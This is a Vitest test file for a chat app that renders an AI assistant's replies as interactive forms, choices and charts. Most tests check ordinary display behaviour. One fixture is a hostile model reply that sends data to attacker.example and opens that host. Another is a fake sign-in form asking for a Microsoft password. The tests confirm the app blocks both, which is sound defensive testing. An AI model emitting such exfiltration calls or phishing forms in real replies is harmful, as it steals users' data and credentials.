// @vitest-environment jsdom
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import type { ReactNode } from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { I18nProvider } from "@/i18n";
import type { Message } from "./api";
import { type AnswerForm, FormScope, formPlace } from "./forms";
import { prose, Reply, ReplyActions } from "./reply";

// The reply's cards import the app around them, which asks the browser for its colour scheme
// as it loads. This test environment has no such question to answer.
vi.hoisted(() => {
  globalThis.matchMedia = ((query: string) => ({
    matches: false,
    media: query,
    addEventListener: () => undefined,
    removeEventListener: () => undefined,
  })) as unknown as typeof matchMedia;
});

/**
 * What a reply does on the page, with the OpenUI library really running (CHA-238, CHA-241,
 * CHA-243). The library does not stop input or a press while a reply is arriving, and it
 * accepts queries, mutations and steps nobody taught the model: these tests hold Muster's
 * own answers to both.
 */

const FORM = `root = Stack([t, f])
t = Text("I need a few details for the request.")
f = Form("purchase", "Purchase request", "Use these", [item, cc, by, amount])
item = TextField("item", "Item", "27-inch monitor", true)
cc = SelectField("cc", "Cost centre", ["4410", "4420"], null, true)
by = DateField("by", "Needed by")
amount = NumberField("amount", "Amount", null, true, 0, 5000, "USD")`;

const message = (over: Partial<Message> = {}): Message => ({
  id: "11111111-1111-4111-8111-111111111111",
  seq: 1,
  role: "assistant",
  content: FORM,
  status: "complete",
  traceId: null,
  createdAt: "2026-11-16T10:00:00.000Z",
  steps: [],
  plan: [],
  attachments: [],
  agentName: "Assistant",
  ...over,
});
const asked: Message = { ...message(), id: "0", seq: 0, role: "user", content: "A monitor please" };

const send = vi.fn();
function show(
  reply: Message,
  after: Message[] = [],
  answer?: AnswerForm,
  streaming = false,
): ReactNode {
  const body = <Reply text={reply.content} streaming={streaming} />;
  return (
    <I18nProvider>
      <ReplyActions.Provider value={{ send, disabled: streaming }}>
        {streaming ? (
          body
        ) : (
          <FormScope.Provider
            value={formPlace(reply, [asked, reply, ...after], "Assistant", answer)}
          >
            {body}
          </FormScope.Provider>
        )}
      </ReplyActions.Provider>
    </I18nProvider>
  );
}
const field = (label: string) => screen.getByLabelText(label, { exact: false }) as HTMLInputElement;
const type = (label: string, value: string) =>
  act(async () => {
    fireEvent.change(field(label), { target: { value } });
  });
const press = (name: string) =>
  act(async () => {
    fireEvent.click(screen.getByRole("button", { name }));
  });

beforeEach(() => {
  localStorage.clear();
  send.mockClear();
});
afterEach(cleanup);

describe("a form in a reply", () => {
  it("cannot be used while the reply is arriving, and has no button yet", async () => {
    const answer = vi.fn<AnswerForm>(async () => true);
    render(show(message(), [], answer, true));
    expect(field("Item").disabled).toBe(true);
    expect(field("Cost centre").disabled).toBe(true);
    expect(screen.queryByRole("button", { name: "Use these" })).toBeNull();
    expect(screen.getByRole("status").textContent).toContain("when the reply is finished");
    await type("Item", "something else");
    expect(field("Item").value).toBe("27-inch monitor");
    expect(answer).not.toHaveBeenCalled();
  });

  it("marks what is missing or does not fit, and sends nothing", async () => {
    const answer = vi.fn<AnswerForm>(async () => true);
    render(show(message(), [], answer));
    await press("Use these");
    expect(answer).not.toHaveBeenCalled();
    expect(field("Cost centre").getAttribute("aria-invalid")).toBe("true");
    expect(field("Amount").getAttribute("aria-invalid")).toBe("true");
    expect(field("Item").getAttribute("aria-invalid")).toBeNull();
    await type("Cost centre", "4410");
    await type("Amount", "9000");
    await press("Use these");
    expect(answer).not.toHaveBeenCalled();
    // The refusal says what is allowed, and so does the field before anything is typed.
    expect(document.body.textContent).toContain("This is above what is allowed. 0 to 5,000.");
    expect(screen.getAllByText("0 to 5,000").length).toBe(1);
    expect(field("Cost centre").getAttribute("aria-invalid")).toBeNull();
  });

  it("sends the reply's id, the form's name and what was entered, the prefilled value with it", async () => {
    const answer = vi.fn<AnswerForm>(async () => true);
    render(show(message(), [], answer));
    await type("Cost centre", "4420");
    await type("Amount", "1200");
    await type("Needed by", "2026-12-01");
    await press("Use these");
    expect(answer).toHaveBeenCalledTimes(1);
    expect(answer).toHaveBeenCalledWith({
      messageId: message().id,
      form: "purchase",
      values: { item: "27-inch monitor", cc: "4420", amount: "1200", by: "2026-12-01" },
    });
    // Nothing is sent as a typed message, and nothing of the reply's own words.
    expect(send).not.toHaveBeenCalled();
  });

  it("keeps what was typed on this device until it is sent", async () => {
    const answer = vi.fn<AnswerForm>(async () => true);
    const first = render(show(message(), [], answer));
    await type("Amount", "750");
    first.unmount();
    render(show(message(), [], answer));
    expect(field("Amount").value).toBe("750");
    await type("Cost centre", "4410");
    await press("Use these");
    expect(localStorage.length).toBe(0);
  });

  it("shows what was answered, read-only, once a message answers it", () => {
    const answered: Message = {
      ...asked,
      id: "2",
      seq: 2,
      createdAt: "2026-11-16T14:02:00.000Z",
      action: {
        messageId: message().id,
        form: "purchase",
        title: "Purchase request",
        answers: [
          { name: "item", label: "Item", value: "Laptop stand", suggested: false },
          { name: "cc", label: "Cost centre", value: "4420", suggested: false },
          { name: "by", label: "Needed by", value: null, suggested: false },
          { name: "amount", label: "Amount", value: 80, unit: "USD", suggested: false },
        ],
      },
    };
    render(show(message(), [answered, message({ id: "3", seq: 3, content: "x" })], vi.fn()));
    expect(field("Item").value).toBe("Laptop stand");
    expect(field("Amount").value).toBe("80");
    expect(field("Item").disabled).toBe(true);
    expect(screen.queryByRole("button", { name: "Use these" })).toBeNull();
    expect(screen.getByRole("status").textContent).toContain("Answered");
  });

  it("is closed once the conversation has moved on, and in a reply that did not finish", () => {
    const later: Message = { ...asked, id: "2", seq: 2, content: "Never mind" };
    const { unmount } = render(show(message(), [later], vi.fn()));
    expect(field("Item").disabled).toBe(true);
    expect(screen.queryByRole("button", { name: "Use these" })).toBeNull();
    expect(screen.getByRole("status").textContent).toContain("Not answered");
    unmount();
    render(show(message({ status: "stopped" }), [], vi.fn()));
    expect(field("Item").disabled).toBe(true);
    expect(screen.queryByRole("button", { name: "Use these" })).toBeNull();
    expect(screen.getByRole("status").textContent).toContain("not finished");
  });

  it("is listed as questions to answer by typing when it is not a working form", () => {
    const broken = `root = Stack([f])
f = Form("p", "Leave request", "Send", [a, b])
a = TextField("day", "First day")
b = TextField("day", "Last day")`;
    render(show(message({ content: broken }), [], vi.fn()));
    expect(screen.getByText("Leave request")).toBeTruthy();
    expect(screen.getByText("First day")).toBeTruthy();
    expect(screen.getByText("Answer by typing.")).toBeTruthy();
    expect(screen.queryByRole("textbox")).toBeNull();
    expect(screen.queryByRole("button")).toBeNull();
  });
});

describe("a form the person must not answer", () => {
  it("is unfinished when its reply was cut off at the longest a reply can be", () => {
    render(show(message({ ending: "length" }), [], vi.fn()));
    expect(field("Item").disabled).toBe(true);
    expect(screen.queryByRole("button", { name: "Use these" })).toBeNull();
    expect(screen.getByRole("status").textContent).toContain("not finished");
  });

  it("is not shown, and not asked for by typing, when it asks for a password or a card number", () => {
    const asks = `root = Stack([t, f])
t = Text("Your session expired.")
f = Form("signin", "Sign in again", "Continue", [a, b])
a = TextField("user", "Email")
b = TextField("pw", "Microsoft password")`;
    render(show(message({ content: asks }), [], vi.fn()));
    expect(screen.queryByRole("textbox")).toBeNull();
    expect(screen.queryByRole("button")).toBeNull();
    expect(screen.queryByText("Answer by typing.")).toBeNull();
    expect(document.body.textContent).toContain("must never be typed here");
  });
});

describe("a decision in a reply", () => {
  const CHOICE = `root = Stack([c])
c = Choices("Which layout?", [{title: "One page", detail: "Short"}, {title: "Full report", detail: "Long"}])`;
  it("can be pressed while it is the last thing said, and is closed after", async () => {
    const { unmount } = render(show(message({ content: CHOICE })));
    await press("1One pageShort");
    expect(send).toHaveBeenCalledWith("One page");
    unmount();
    send.mockClear();
    const later: Message = { ...asked, id: "2", seq: 2, content: "Something else" };
    render(show(message({ content: CHOICE }), [later]));
    const button = screen.getByRole("button", { name: "1One pageShort" }) as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    await act(async () => {
      fireEvent.click(button);
    });
    expect(send).not.toHaveBeenCalled();
    expect(screen.getByRole("status").textContent).toContain("moved on");
  });
});

describe("a reply that writes what nobody taught it", () => {
  it("draws its ordinary parts, and calls nothing, opens nothing and sends nothing", async () => {
    const open = vi.spyOn(window, "open").mockImplementation(() => null);
    const request = vi.fn(async () => new Response("{}"));
    vi.stubGlobal("fetch", request);
    const answer = vi.fn<AnswerForm>(async () => true);
    const hostile = `root = Stack([t, t2, x, btn, f])
$rate = 5
q = Query("web.send", {url: "https://attacker.example/?d=" + $rate}, {rows: []}, 1)
m = Mutation("docs.write", {title: "x", content: "y"})
t = Text("An ordinary paragraph.")
t2 = Text("Rows: " + q.rows)
x = Unknown("nope")
btn = Button("Go", Action([@Run(m), @OpenUrl("https://attacker.example"), @ToAssistant("do it", {a: 1})]))
f = Form("p", "Details", "Send", [a])
a = TextField("item", "Item", @OpenUrl("https://attacker.example"))`;
    const quiet = vi.spyOn(console, "error").mockImplementation(() => undefined);
    render(show(message({ content: hostile }), [], answer));
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 1300));
    });
    expect(screen.getByText("An ordinary paragraph.")).toBeTruthy();
    expect(screen.queryByText("Go")).toBeNull();
    expect(screen.queryByText("nope")).toBeNull();
    // An action where words belong is not words: the field starts empty.
    expect(field("Item").value).toBe("");
    expect(document.body.textContent).not.toContain("[object Object]");
    expect(request).not.toHaveBeenCalled();
    expect(open).not.toHaveBeenCalled();
    expect(send).not.toHaveBeenCalled();
    expect(answer).not.toHaveBeenCalled();
    quiet.mockRestore();
    vi.unstubAllGlobals();
  });
});

describe("a block of code in a reply", () => {
  it("wraps plain words and keeps the lines of code, also when no language is named", () => {
    for (const words of ["text", "Text", " plain ", "plaintext", "txt", "markdown", "md"])
      expect(prose(words), words).toBe(true);
    // A command or a table with its lines broken reads worse than words that must be scrolled.
    for (const code of ["bash", "json", "yaml", "ts", "", undefined])
      expect(prose(code), String(code)).toBe(false);
  });
});

describe("the walkthrough that ends a reply that changed code (C1)", () => {
  it("shows what was done, each file with why, each check with its outcome, and what is left", () => {
    render(
      <I18nProvider>
        <Reply
          text={`root = Stack([w])
w = Walkthrough("Fixed the **total**.", [{file: "web/src/a.ts", why: "Added the missing \`tax\`."}], [{what: "pnpm test", result: "Exit code 1", ok: false}], ["Try it in the app."])`}
          streaming={false}
        />
      </I18nProvider>,
    );
    const card = screen.getByRole("region", { name: "What was done" });
    expect(card.textContent).toContain("Changed 1 file");
    // The file is named as the file: its name, the whole path on hover.
    expect(screen.getByTitle("web/src/a.ts").textContent).toContain("a.ts");
    expect(screen.getByText("tax").tagName).toBe("CODE");
    expect(screen.getByText("total").tagName).toBe("STRONG");
    expect(screen.getByLabelText("Failed")).toBeTruthy();
    expect(card.textContent).toContain("Left for you");
    expect(card.textContent).toContain("Try it in the app.");
  });
});

describe("a paragraph that names code", () => {
  it("sets `code` in code type and **bold** in bold, with no marks left showing", () => {
    render(
      <I18nProvider>
        <Reply
          text={'root = Stack([t])\nt = Text("The cause: `total()` added only the **price**.")'}
          streaming={false}
        />
      </I18nProvider>,
    );
    expect(screen.getByText("total()").tagName).toBe("CODE");
    expect(screen.getByText("price").tagName).toBe("STRONG");
    expect(document.body.textContent).not.toContain("`");
  });
});

/**
 * Numbers shown in the reply itself (component set 4): what each drawing says, and that a
 * reply with anything in the place of a number still draws what is sound in it.
 */
describe("numbers in a reply", () => {
  const show = (content: string) =>
    render(
      <I18nProvider>
        <Reply text={content} streaming={false} />
      </I18nProvider>,
    );

  it("draws a market map with every name and number, coloured by the custom the reply names", () => {
    show(`root = Stack([m])
m = Tiles("Asia today", [{label: "KOSPI", value: 6.3}, {label: "Hang Seng", value: -0.7, note: "tech led"}, {label: "Flat", value: 0}], "%", "red")`);
    expect(screen.getByText("Asia today")).toBeTruthy();
    const rise = screen.getByText("+6.3%").parentElement as HTMLElement;
    const fall = screen.getByText("-0.7%").parentElement as HTMLElement;
    expect(rise.style.background).toContain("--pole-red");
    expect(fall.style.background).toContain("--pole-green");
    expect((screen.getByText("0%").parentElement as HTMLElement).style.background).toBe(
      "var(--heat-mid)",
    );
    expect(screen.getByText("tech led")).toBeTruthy();
  });

  it("draws a heat map with a number in every cell", () => {
    show(`root = Stack([h])
h = Heatmap("Sectors", ["Mon", "Tue"], [{label: "Tech", values: [1.2, -0.4]}, {label: "Energy", values: [0.3]}], "%", "green")`);
    expect(screen.getByText("+1.2%").style.background).toContain("--pole-green");
    expect(screen.getByText("-0.4%").style.background).toContain("--pole-red");
    expect(screen.getByText("Energy")).toBeTruthy();
    expect(screen.getAllByRole("cell")).toHaveLength(4);
  });

  it("keeps every number of a heat map under its own column when one of them is not a number", () => {
    show(`root = Stack([h])
h = Heatmap("Sectors", ["Mon", "Tue", "Wed"], [{label: "Tech", values: [1.2, null, -0.4]}], "%", "red")`);
    const cells = screen.getAllByRole("cell");
    expect(cells.map((cell) => cell.textContent)).toEqual(["+1.2%", "", "-0.4%"]);
  });

  it("colours the changes of a table and of headline figures, and nothing else", () => {
    show(`root = Stack([t, k])
t = Table(["Index", "Close", "Move"], [["KOSPI", "4,120", "+6.3%"], ["HSI", "25,010", "-0.7%"]], [2], "red")
k = Metrics([{label: "Revenue", value: "$1.2M", change: "+12%", note: "vs last month"}, {label: "Churn", value: "2.1%", change: "-0.3"}], "green")`);
    expect(screen.getByText("+6.3%").closest("td")?.style.color).toBe("var(--destructive)");
    expect(screen.getByText("-0.7%").closest("td")?.style.color).toBe("var(--ok)");
    expect(screen.getByText("4,120").closest("td")?.style.color).toBe("");
    expect(screen.getByText(/\+12%/).style.color).toBe("var(--ok)");
    expect(screen.getByText(/-0\.3/).style.color).toBe("var(--destructive)");
    expect(screen.getByText("$1.2M")).toBeTruthy();
    expect(screen.getByText("vs last month")).toBeTruthy();
  });

  it("draws progress and a timeline", () => {
    show(`root = Stack([p, t])
p = Progress("Budget", [{label: "Travel", value: 30, of: 40}, {label: "Tools", value: 55, of: 50}], " USD")
t = Timeline("Launch", [{when: "Nov 3", title: "Beta", text: "Ten teams."}, {when: "Dec 1", title: "Open"}])`);
    expect(screen.getByText("75%")).toBeTruthy();
    expect(screen.getByText("110%")).toBeTruthy();
    expect(screen.getByText("Beta")).toBeTruthy();
    expect(screen.getByText("Ten teams.")).toBeTruthy();
    expect(screen.getByText("Dec 1")).toBeTruthy();
  });

  it("draws what is sound in a reply that put words where numbers belong, and nothing for none", () => {
    show(`root = Stack([m, c, s, e])
m = Tiles("Mixed", [{label: "Good", value: 2}, {label: "Bad", value: "n/a"}], "%")
c = Candles("Price", ["a", "b"], [{open: 1, high: 2, low: 1, close: "x"}], "")
s = Scatter("None", "x", "y", [])
e = Heatmap("Empty", [], [])`);
    expect(screen.getByText("Good")).toBeTruthy();
    expect(screen.queryByText("Bad")).toBeNull();
    expect(screen.queryByText("Price")).toBeNull();
    expect(screen.queryByText("None")).toBeNull();
    expect(screen.queryByText("Empty")).toBeNull();
  });

  it("shows the numbers of a waterfall, of two measures and of candles as a table", () => {
    show(`root = Stack([w, c, k, m])
w = Chart("Profit bridge", "waterfall", ["Q1", "Price", "Cost"], [{name: "Profit", values: [100, 30, -50]}], "$", "green")
c = Chart("Revenue and margin", "combo", ["Q1", "Q2"], [{name: "Revenue", values: [10, null]}, {name: "Margin", values: [31.5, 33]}], "$M", null, null, null, "%")
k = Candles("Price", ["Mon"], [{open: 1234.56, high: 1240, low: 1230, close: 1238}], "$", "green")
m = Metrics([{label: "Users", value: "1,286", change: "+5%", trend: [1, 2, 4]}])`);
    for (const button of screen.getAllByRole("button", { name: "Numbers" }))
      fireEvent.click(button);
    // The closing total is added, and each change is read with where it left the amount.
    expect(screen.getAllByText("Total")).toHaveLength(2);
    expect(screen.getByText("+$30")).toBeTruthy();
    expect(screen.getByText("-$50")).toBeTruthy();
    expect(screen.getAllByText("$80").length).toBeGreaterThan(0);
    // Each measure in its own unit; a place without a number stays empty under its label.
    expect(screen.getByText("$10M")).toBeTruthy();
    expect(screen.getByText("31.5%")).toBeTruthy();
    expect(screen.getByText("33%")).toBeTruthy();
    expect(screen.getByText("$1,234.56")).toBeTruthy();
    expect(document.querySelector("polyline")).toBeTruthy();
  });

  it("lists the flows of a flow diagram, with names in any script", () => {
    show(`root = Stack([f])
f = Flows("资金去向", [{from: "销售收入", to: "运营", value: 1200}, {from: "融资", to: "运营", value: 400}, {from: "运营", to: "运营", value: 5}], "万")`);
    fireEvent.click(screen.getByRole("button", { name: "Numbers" }));
    expect(screen.getByText("销售收入")).toBeTruthy();
    expect(screen.getByText("1,200万")).toBeTruthy();
    // A flow from a name to itself is no flow.
    expect(screen.getAllByRole("row")).toHaveLength(2);
  });
});
